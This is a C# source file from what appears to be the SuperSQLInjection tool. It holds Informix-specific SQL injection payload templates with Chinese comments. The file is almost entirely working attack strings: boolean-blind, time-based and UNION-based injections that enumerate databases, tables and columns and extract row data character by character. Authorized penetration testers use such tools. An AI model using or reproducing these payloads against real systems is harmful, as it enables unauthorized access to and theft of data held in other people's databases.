using System;
using System.Collections.Generic;
using System.Text;
using tools;

namespace SuperSQLInjection.payload
{
    class Informix
    {
        //加载对应配置(需要读取的环境变量)
        public static String path = "config/vers/informix.txt";
        public static List<String> vers = FileTool.readFileToList(path);

        //数据库数量
        public static String dbs_count = "(select count(*) from sysmaster:sysdatabases)";
        //表数量
        public static String tables_count = "(select count(*) from {dbname}:systables where tabtype='T' and tabid>99)";
        //列数量
        public static String columns_count = "(select count(*) from {dbname}:systables t,{dbname}:syscolumns c where t.tabid=c.tabid and t.tabname='{table}')";


        //获取数据库名
        public static String db_value = "(select name from (select skip {index} first 1 name  from sysmaster:sysdatabases))";
        //获取表名称
        public static String table_value = "(select tabname from (select skip {index} first 1 tabname from {dbname}:systables where tabtype='T' and tabid>99))";
        //获取列名称
        public static String column_value = "(select colname from (select skip {index} first 1 colname from {dbname}:systables t,{dbname}:syscolumns c where t.tabid=c.tabid and t.tabname='{table}'))";


        //获取数据库数量bool方式
        public static String bool_db_count = " " + dbs_count + ">{len}";
        //获取表数量bool
        public static String bool_tables_count = " " + tables_count + ">{len}";
        //获取列数量bool
        public static String bool_columns_count = " " + columns_count + ">{len}";
        


        public static String substr = "substr(({data})),{index},1)";
        //多字节
        public static String hex_value = "ascii({data})";
        
        //bool方式字符长度判断
        public static String bool_length = " length(({data}))>{len}";

        //bool方式获取值
        public static String bool_value = " ascii(substr({data},{index},1))>{len}";
        //最大32767
        public static String cast_value = "rtrim(cast({data} as char(32767)))";
        public static String no_cast_value = "({data})";

        //获取行数据
        public static String data_value = "(select "+ cast_value + " from (select skip {index} first 1 {allcolumns} from {dbname}:{table}))";

        //获取行数据
        public static String data_no_cast_value = "(select {data} from (select skip {index} first 1 {allcolumns} from {dbname}:{table}))";


        //union获取数据条数
        public static String data_count = "(select count(*) from {dbname}:{table})";

        public static String bool_datas_count = " " + data_count + ">={len}";

        //union获取值
        public static String union_value = " 1=2 union all select {data} from sysmaster:sysdual";


        public static String rand = Tools.RandNum(3);

        public static String start = rand + 0;
        public static String mid = rand + 5;
        public static String end = rand + 9;


        public static String getBoolDataBySleep(String data)
        {
            return " 1=(case when(" + data + ") then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)";
        }

        public static String getBoolCountBySleep(String data)
        {
            return " 1=(case when(" + data + ") then (select 1 from(select count(*) from sysmaster:syspaghdr)) else 1 end)";
        }

        public static String getUnionDataValue(String unionFileTemplate, String dataPayLoad, String dbname, String table, String index,String castStr)
        {
            String temlate=unionFileTemplate.Replace("{data}", "(to_char("+start+ ")||to_char(" + start + ")||" + castStr.Replace("{data}", dataPayLoad.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index)) + "||to_char(" + end + ")||to_char(" + end + "))");
            return union_value.Replace("{data}", temlate);
        }

        public static String unionColumns(List<String> columns, String unionStr)
        {
            StringBuilder sb = new StringBuilder();
            decimal c = 32000 / columns.Count;
            int max = (int)Math.Ceiling(c);
       
            foreach (String column in columns)
            {
                sb.Append(cast_value.Replace("32767", max.ToString()).Replace("{data}", column) + unionStr);
            }
            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
            return sb.ToString();
        }

        public static String getUnionDataValue(String unionFileTemplate, List<String> columns, String dbname, String table, String index)
        {
           String data = "to_char(" + start + ")||to_char(" + start + ")||" + unionColumns(columns,"||to_char("+ mid + ")||") + "||to_char(" + end + ")||to_char(" + end + ")";
           String template= unionFileTemplate.Replace("{data}", (data_no_cast_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index)));  
            return union_value.Replace("{data}", template);
        }

        /// <summary>
        /// 获得bool方式值payload
        /// </summary>
        /// <param name="dataStr">对应值的查询SQL</param>
        /// <param name="dbName">数据库名</param>
        /// <param name="table">表名</param>
        /// <param name="index">下标</param>
        /// <returns></returns>
        public static String getBoolDataPayLoad(String column, String dbName, String table, int index)
        {
            String payload = data_value.Replace("{data}", column).Replace("{allcolumns}", column).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
            return payload;
        }
    }
}
